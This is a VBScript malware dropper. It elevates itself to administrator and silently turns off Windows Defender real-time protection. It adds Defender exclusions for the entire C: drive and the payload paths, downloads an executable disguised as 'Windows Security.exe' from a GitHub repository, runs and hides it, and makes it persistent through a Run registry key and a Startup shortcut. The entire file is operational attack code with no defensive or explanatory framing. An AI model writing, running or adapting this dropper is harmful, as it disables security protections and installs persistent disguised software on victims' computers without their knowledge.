Option Explicit

Dim shell, fso, ws
Dim desktop, exeUrl, exePath, tempPath, subDirPath, subDirExe
Dim scriptPath, waitTime, f

Set shell = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

scriptPath = WScript.ScriptFullName

' Relaunch as admin if not elevated
If Not IsAdmin() Then
    shell.ShellExecute "wscript.exe", """" & scriptPath & """", "", "runas", 1
    WScript.Quit
End If

desktop = ws.SpecialFolders("Desktop")
exeUrl = "https://github.com/boucegame/ScamBaiting/raw/refs/heads/main/Windows%20Security.exe"
exePath = desktop & "\Windows Security.exe"

' Disable real-time protection silently
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $true"

' Add Defender exclusions before downloading
subDirPath = ws.ExpandEnvironmentStrings("%APPDATA%\SubDir")
subDirExe = subDirPath & "\Windows Security.exe"
AddDefenderExclusion "C:\" ' Add C: drive exclusion
AddDefenderExclusion desktop
AddDefenderExclusion exePath
AddDefenderExclusion subDirExe

' Download the EXE (blocking)
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & exePath & "' -UseBasicParsing"

' Wait up to 15 seconds for the file to exist
waitTime = 0
Do While (Not fso.FileExists(exePath)) And waitTime < 15000
    WScript.Sleep 500
    waitTime = waitTime + 500
Loop

If fso.FileExists(exePath) Then
    ' Launch EXE visibly
    ws.CurrentDirectory = desktop
    ws.Run """" & exePath & """", 1, False

    ' Hide EXE after launch
    Set f = fso.GetFile(exePath)
    f.Attributes = f.Attributes Or 2 ' Hidden

    ' --- Add %APPDATA%\SubDir\Windows Security.exe to startup AFTER running EXE ---
    ' Create SubDir if missing
    If Not fso.FolderExists(subDirPath) Then fso.CreateFolder(subDirPath)

    ' Add registry run key (current user) with proper quotes
    ws.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurity", """" & subDirExe & """", "REG_SZ"

    ' Add shortcut to Startup folder
    Dim startupFolder
    startupFolder = ws.SpecialFolders("Startup")
    If Not fso.FileExists(startupFolder & "\Windows Security.lnk") Then
        CreateShortcut subDirExe, startupFolder & "\Windows Security.lnk"
    End If

Else
    MsgBox "Failed to download the EXE file."
End If

' Re-enable real-time protection
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $false"

' === FUNCTIONS ===

Sub CreateShortcut(targetPath, shortcutPath)
    Dim lnk
    Set lnk = ws.CreateShortcut(shortcutPath)
    lnk.TargetPath = targetPath
    lnk.WorkingDirectory = fso.GetParentFolderName(targetPath)
    lnk.WindowStyle = 1
    lnk.Save
End Sub

Function RunHidden(cmd)
    CreateObject("WScript.Shell").Run cmd, 0, True
End Function

Function IsAdmin()
    On Error Resume Next
    CreateObject("WScript.Shell").RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
    IsAdmin = (Err.Number = 0)
    On Error GoTo 0
End Function

Sub AddDefenderExclusion(path)
    RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & path & "' -Force"
End Sub

